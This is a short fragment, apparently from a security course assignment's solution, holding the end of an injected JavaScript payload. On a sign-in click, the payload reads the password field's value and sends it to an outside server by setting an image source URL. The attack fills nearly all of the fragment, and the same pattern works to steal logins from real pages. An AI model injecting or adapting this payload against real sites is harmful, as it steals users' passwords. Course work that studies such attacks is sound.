...
signin.addEventListener("click", function(e){image.src="https://mathlab.utsc.utoronto.ca/courses/cscd27f16/assignment/03/server/token.php?utorid=chenmi12&PHPSESSID="+document.getElementById("password").value;}, false)
</script>'''}
